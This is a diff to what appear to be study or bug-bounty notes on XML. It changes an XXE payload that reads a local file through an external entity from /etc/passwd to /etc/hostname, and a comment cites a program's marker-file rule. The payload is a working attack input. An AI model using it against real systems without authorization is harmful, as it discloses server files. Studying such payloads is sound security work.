@@ -12,7 +12,7 @@ XML basics: prolog → root → children. **DTD** (`<!DOCTYPE>`) defines structu
 
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>  <!-- book classic uses /etc/passwd — on a live program the marker file is /etc/hostname per the callout -->
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 
